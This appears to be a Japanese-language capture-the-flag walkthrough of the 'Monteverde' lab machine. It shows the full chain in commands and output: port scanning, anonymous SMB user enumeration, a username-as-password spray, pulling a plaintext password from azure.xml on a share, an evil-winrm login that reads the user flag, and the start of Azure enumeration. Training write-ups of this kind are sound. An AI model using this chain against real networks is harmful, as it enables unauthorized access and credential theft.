## STEP 1
```sh
└─$ rustscan -a 10.129.228.111 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.228.111:53
Open 10.129.228.111:88
Open 10.129.228.111:135
Open 10.129.228.111:139
Open 10.129.228.111:389
Open 10.129.228.111:445
Open 10.129.228.111:464
Open 10.129.228.111:593
Open 10.129.228.111:636
Open 10.129.228.111:3268
Open 10.129.228.111:3269
Open 10.129.228.111:5985
Open 10.129.228.111:9389
Open 10.129.228.111:49667
Open 10.129.228.111:49674
Open 10.129.228.111:49673
Open 10.129.228.111:49676
Open 10.129.228.111:49696
10.129.228.111 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49674,49673,49676,49696]
```


## STEP 2
クレデンシャルなしでユーザ列挙できた
```sh
└─$ netexec smb 10.129.228.111 -u '' -p '' --users-export users.txt     
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.129.228.111  445    MONTEVERDE       -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.228.111  445    MONTEVERDE       Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.228.111  445    MONTEVERDE       AAD_987d7f2f57d2              2020-01-02 22:53:24 0       Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
SMB         10.129.228.111  445    MONTEVERDE       mhope                         2020-01-02 23:40:05 0        
SMB         10.129.228.111  445    MONTEVERDE       SABatchJobs                   2020-01-03 12:48:46 0        
SMB         10.129.228.111  445    MONTEVERDE       svc-ata                       2020-01-03 12:58:31 0        
SMB         10.129.228.111  445    MONTEVERDE       svc-bexec                     2020-01-03 12:59:55 0        
SMB         10.129.228.111  445    MONTEVERDE       svc-netapp                    2020-01-03 13:01:42 0        
SMB         10.129.228.111  445    MONTEVERDE       dgalanos                      2020-01-03 13:06:10 0        
SMB         10.129.228.111  445    MONTEVERDE       roleary                       2020-01-03 13:08:05 0        
SMB         10.129.228.111  445    MONTEVERDE       smorgan                       2020-01-03 13:09:21 0        
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated 10 local users: MEGABANK
SMB         10.129.228.111  445    MONTEVERDE       [*] Writing 10 local users to users.txt
```
パスワードにユーザ名を使いまわしてないか確認、「SABatchJobs」のパスワードがユーザ名と同じですね
```sh
└─$ netexec smb 10.129.228.111 -u users.txt -p users.txt 
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 

省略

SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```
「SABatchJobs」ではwinrmログインできないもよう
```sh
┌──(kali㉿kali)-[~/htb/smb]
└─$ evil-winrm -i 10.129.228.111 -u SABatchJobs -p SABatchJobs
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```
共有フォルダ列挙、「users$mhope/azure.xml」が怪しい
```sh
└─$ netexec smb 10.129.228.111 -u SABatchJobs -p SABatchJobs -M spider_plus
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ            
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       users$          READ            
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.228.111.json".
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] SMB Shares:           8 (ADMIN$, azure_uploads, C$, E$, IPC$, NETLOGON, SYSVOL, users$)
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] SMB Readable Shares:  5 (azure_uploads, IPC$, NETLOGON, SYSVOL, users$)
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] Total folders found:  23
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] Total files found:    6
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] File size average:    1.58 KB
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] File size min:        22 B
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] File size max:        4.43 KB

└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.228.111.json 
{
    "NETLOGON": {},
    "SYSVOL": {
        "MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2020-01-03 07:47:23",
            "ctime_epoch": "2020-01-02 17:05:22",
            "mtime_epoch": "2020-01-03 07:47:23",
            "size": "22 B"
        },
        "MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2020-01-03 07:47:23",
            "ctime_epoch": "2020-01-02 17:05:22",
            "mtime_epoch": "2020-01-03 07:47:23",
            "size": "1.07 KB"
        },
        "MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2020-01-02 17:17:56",
            "ctime_epoch": "2020-01-02 17:17:56",
            "mtime_epoch": "2020-01-02 17:17:56",
            "size": "2.73 KB"
        },
        "MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2020-01-02 17:26:34",
            "ctime_epoch": "2020-01-02 17:05:22",
            "mtime_epoch": "2020-01-02 17:26:34",
            "size": "22 B"
        },
        "MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2020-01-02 17:26:34",
            "ctime_epoch": "2020-01-02 17:05:22",
            "mtime_epoch": "2020-01-02 17:26:34",
            "size": "4.43 KB"
        }
    },
    "azure_uploads": {},
    "users$": {
        "mhope/azure.xml": {
            "atime_epoch": "2020-01-03 08:41:18",
            "ctime_epoch": "2020-01-03 08:39:53",
            "mtime_epoch": "2020-01-03 09:59:24",
            "size": "1.18 KB"
        }
    }
} 
```
「users$mhope/azure.xml」をダウンロード・確認  
パスワードっぽものを確認、ファイルパスからユーザ「mhope」のパスワードかも
```sh
└─$ netexec smb 10.129.228.111 -u SABatchJobs -p SABatchJobs --share users$ --get-file /mhope/azure.xml /home/kali/azure.xml
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.129.228.111  445    MONTEVERDE       [*] Copying "/mhope/azure.xml" to "/home/kali/azure.xml"
SMB         10.129.228.111  445    MONTEVERDE       [+] File "/mhope/azure.xml" was downloaded to "/home/kali/azure.xml"

└─$ cat azure.xml                                                  
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```
winrmでログイン成功！ユーザフラグゲット
```sh
└─$ evil-winrm -i 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'                                         
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> cat ../Desktop/user.txt
efa3cbf7ec605f05e2bf992719a040ff
```


## STEP 3
```sh
*Evil-WinRM* PS C:\Users\mhope\Documents> Get-AzContext -ListAvailable

Name                                     Account                                              SubscriptionName                                    Environment                                         TenantId
----                                     -------                                              ----------------                                    -----------                                         --------
372efea9-7bc4-4b76-8839-984b45edfb98 ... john@a67632354763outlook.onmicrosoft.com                                                                 AzureCloud                                          372efea9-7bc4-4b76-8839-984b45edfb98

*Evil-WinRM* PS C:\Users\mhope\Documents> Get-AzSubscription
Warning: Unable to acquire token for tenant '372efea9-7bc4-4b76-8839-984b45edfb98'
Warning: Unable to acquire token for tenant '372efea9-7bc4-4b76-8839-984b45edfb98'
```
